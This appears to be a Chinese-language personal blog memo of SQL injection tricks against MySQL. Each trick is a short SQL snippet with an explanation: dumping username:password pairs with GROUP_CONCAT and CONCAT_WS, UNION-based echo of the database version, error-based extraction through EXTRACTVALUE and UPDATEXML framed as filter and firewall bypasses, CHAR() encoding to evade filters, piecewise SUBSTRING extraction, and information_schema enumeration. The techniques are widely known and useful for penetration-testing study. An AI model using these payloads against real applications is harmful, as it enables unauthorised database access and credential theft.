---
title: SQLi小技巧
date: 2024-10-13 15:34:35
tags:
  - sql
  - 注入
categories: 备忘录
description: 在SQL注入（SQLi）测试过程中，使用一些小技巧可以帮助我们更高效地提取数据、绕过过滤机制或获得更好的回显。
top_img: https://pic.imgdb.cn/item/66fe2fc70a206445e3a88ab1.jpg
cover: https://pic.imgdb.cn/item/66fe2fc70a206445e3a88ab1.jpg
---
## **`GROUP_CONCAT` 排版改进**  

你提到的技巧通过使用 `GROUP_CONCAT` 来连接多个值，并且使用自定义分隔符（如`'<br>'`）来美化输出。以下是类似的用法，可以进行数据的分段显示或结构化回显。
### 示例

```sql
SELECT GROUP_CONCAT(username, ':', password SEPARATOR ' | ') FROM staff_users;
```
 
 **作用**：将所有用户名和密码输出成 `username:password | username2:password2 | ...` 的格式，方便读取。
### 常用格式化方式

- `SEPARATOR '<br>'`：适合HTML环境中进行换行显示。
- `SEPARATOR ' | '`：适合命令行回显，格式化信息。
- `SEPARATOR ','`：逗号分隔显示，适合CSV风格输出。
## **`CONCAT_WS` 替代 `GROUP_CONCAT`**

`CONCAT_WS` 可以指定一个分隔符，并灵活地将多个列的值连接在一起，常用于构造更易于阅读的输出。
### 示例

```sql
SELECT CONCAT_WS(' : ', username, password) FROM staff_users;
```

 **作用**：将 `username` 和 `password` 用 `:` 分隔，结果类似于 `username : password`。
### 小技巧

`CONCAT_WS` 可以自动忽略空字段，因此在处理可能包含 `NULL` 值时比 `CONCAT` 更安全。
##  **`UNION` 合并多列回显**  

在SQLi中，常常通过 `UNION` 语句来构造多列输出，并将敏感信息通过不同列进行回显。
### 示例

```sql
SELECT id, username FROM staff_users 
UNION 
SELECT 1, CONCAT(version(), ' | ', database());
```

 **作用**：回显数据库版本和当前数据库名，并通过UNION将它与普通数据结果集混合。
 **技巧**：如果注入点回显多个列，利用 `UNION` 可以将多个信息源结合到同一查询中。
##  **`EXTRACTVALUE` 和 `UPDATEXML` 绕过**

在某些环境中，XML函数可以被滥用来进行回显。
### 示例（`EXTRACTVALUE`）

```sql
SELECT EXTRACTVALUE(1, CONCAT(0x3a, (SELECT database())));
```

 **作用**：返回当前数据库名称，利用 `EXTRACTVALUE` 绕过某些安全过滤。
### 示例（`UPDATEXML`）

```sql
SELECT UPDATEXML(1, CONCAT(0x7e, (SELECT version())), 1);
```

 **作用**: 返回数据库版本信息，可能用来绕过字符限制或应用防火墙。
 
## **`LIMIT` 和 `OFFSET` 分页提取**

当目标数据库存在大量数据时，使用 `LIMIT` 和 `OFFSET` 可以分批提取数据，避免回显过多内容造成干扰。
### 示例

```sql
SELECT username, password FROM staff_users LIMIT 10 OFFSET 20;
```

**作用**：提取第21条到第30条数据，避免一次性回显太多行，适合大型数据集。
## **`CHAR` 函数注入**

使用 `CHAR()` 函数可以将字符串表示为ASCII字符，帮助绕过一些基于字符串的过滤机制。
### 示例

```sql
SELECT CHAR(117,115,101,114,110,97,109,101) FROM dual;
```

**作用**：通过ASCII码返回 `username` 字符串，有助于绕过某些字符过滤或限制。
## **`SUBSTRING` 提取指定位置的数据**

使用 `SUBSTRING` 可以提取特定长度的数据段，适合回显受限时分段提取信息。
### 示例

```sql
SELECT SUBSTRING((SELECT password FROM staff_users LIMIT 1), 1, 10);
```

**作用**：提取第一个用户密码的前10个字符，逐步获取完整信息。
## **`ORDER BY` 组合信息泄露**

在注入点可以操作 `ORDER BY` 时，可以通过修改排序规则提取敏感信息。
#### 示例

```sql
SELECT username FROM staff_users ORDER BY (SELECT database());
```

**作用**: 使用当前数据库名来排序用户数据，可能导致SQL注入响应中的非预期行为。
## **`INFORMATION_SCHEMA` 读取数据库结构**

利用 `INFORMATION_SCHEMA` 可以获取数据库中的表和列的信息。
### 示例（列出所有表名）

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
```

**作用**：列出当前数据库中的所有表名，帮助进一步进行数据提取。

### 示例（列出某个表的列名）

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'staff_users';
```
**作用**：列出 `staff_users` 表中的所有列名，为后续攻击提供详细信息。

## **`IFNULL` 和 `COALESCE` 避免空值回显**

如果某些字段可能为 `NULL`，可以使用 `IFNULL` 或 `COALESCE` 函数来替换空值，避免回显数据缺失。

### 示例

```sql
SELECT COALESCE(username, 'unknown'), COALESCE(password, 'no_password') FROM staff_users;
```

**作用**：确保即使字段为 `NULL` 也能输出替代值，保持回显数据完整。

## **`CASE` 条件回显**

使用 `CASE` 可以基于特定条件定制化输出。

### 示例

```sql
SELECT username, CASE WHEN length(password) > 8 THEN 'Strong' ELSE 'Weak' END FROM staff_users;
```

**作用**：基于密码长度对密码强度进行判断并输出。
